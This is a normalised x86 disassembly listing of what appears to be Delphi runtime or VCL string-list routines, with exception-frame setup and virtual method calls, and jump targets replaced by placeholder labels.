call sub_4483f8
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4483f8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4255a8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_44a1b8
sub_4255a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4256eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_449d2c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_4483f8
mov edi eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256f2
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
test edi edi
je r-xdata
mov eax [ edi ]
call sub_44843c
test eax eax
je r-xdata
mov eax [ edi ]
call sub_44843c
call sub_42f6b8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
add eax eax
add eax eax
call sub_44748c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4256c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
call sub_44843c
mov edx [ ebp - 0xc ]
call sub_42fa58
movsx esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4474a8
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax edi
call sub_42fadc
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + ebx * 4 ]
lea edx [ ebp - 0x14 ]
call sub_42f668
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
add eax 0x14
call sub_449d2c
sub_4256fc
push ebx
push esi
mov esi edx
call sub_425354
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_425718
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_448388
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_424590
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_425420
xor ecx ecx
mov edx esi
mov eax ebx
call sub_425090
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_424674
sub_425780
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4247d4
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4248a0
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4245dc
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_425090
mov eax ebx
call sub_425420
pop edi
pop esi
pop ebx
retn
sub_4257dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4246e8
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4246e8
call sub_4481b0
pop edi
pop esi
pop ebx
retn
sub_425820
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_425844
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_4252bc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42588c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4265b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4258bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4258e0
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_425904
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4259ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_425a78
xor eax eax
push ebp
push sub_42598e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425995
mov eax [ ebp - 0x4 ]
call sub_425b40
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4259bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424dc0
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425a78
xor eax eax
push ebp
push sub_425a5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
movzx eax [ esi + 0xe ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xe ] ax
movzx eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] ax
movzx eax [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] ax
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ esi + 0x8 ]
call sub_449d2c
movzx eax [ esi + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425b40
retn
sub_425a90
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_425b54
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_425aad
inc edx
add al ch
aam 0x28
add al [ eax ]
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_425b54
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_425ae8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4263cc
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push ebp
call sub_425a90
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425b54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425be9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425bf0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_44936c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call j_sub_44a294
jne r-xdata
sub_425c00
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_425bfc
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
jmp sub_448c38
sub_425c38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_425c80
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44be28
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_425c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c87
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_425c90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425d6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_425a78
xor eax eax
push ebp
push sub_425d46
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d4d
mov eax [ ebp - 0x8 ]
call sub_425b40
retn
sub_425d88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_425dcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_449db8
call sub_436418
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425dd4
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_425ddc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425f67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_426870
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
xor edx edx
call sub_449e68
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x14 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f6e
lea eax [ ebp - 0x24 ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
add eax ebx
add [ ebp - 0x18 ] eax
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ecx ebx
add ecx ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4476cc
mov eax ebx
add eax eax
add [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov ebx [ ebp - 0x28 ]
test ebx ebx
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov ecx ebx
add ecx ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_4476cc
mov eax ebx
add eax eax
add [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_425f74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_425fec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ff3
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_426000
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4260c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44a368
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_4269a8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_449e98
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_43b058
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4260ca
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4260d4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_426108
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_426138
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4277b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426180
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426187
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_42618c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4277b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4261d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261e0
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_4261f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4262d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_425a78
xor eax eax
push ebp
push sub_4262ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov eax esi
call sub_427274
sub ebx eax
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c270
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_44af28
sub eax ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_43c978
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262b5
mov eax [ ebp - 0x8 ]
call sub_425b40
retn
sub_4262e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426389
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426390
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x8 ]
call sub_425a78
xor eax eax
push ebp
push sub_42636c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_425b40
retn
sub_426398
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx ebp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4263cc
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426470
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4297c4
mov eax [ ebp - 0x4 ]
call sub_425a78
xor eax eax
push ebp
push sub_42644b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_428668
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42a58c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426452
mov eax [ ebp - 0x4 ]
call sub_425b40
retn
sub_42648c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4277b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4264df
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264e6
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_4264fc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4265a5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43c500
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_44af28
test eax eax
jle r-xdata
call sub_43c914
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_44af28
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_427500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265ac
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_44a7e8
retn
mov eax [ ebp - 0x8 ]
call sub_44af28
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_427500
sub_4265b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
je r-xdata
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_44b8f0
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_4265ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42662f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449ed8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426636
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42663c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4267c4
push [ fs : eax ]
mov [ fs : eax ] esp
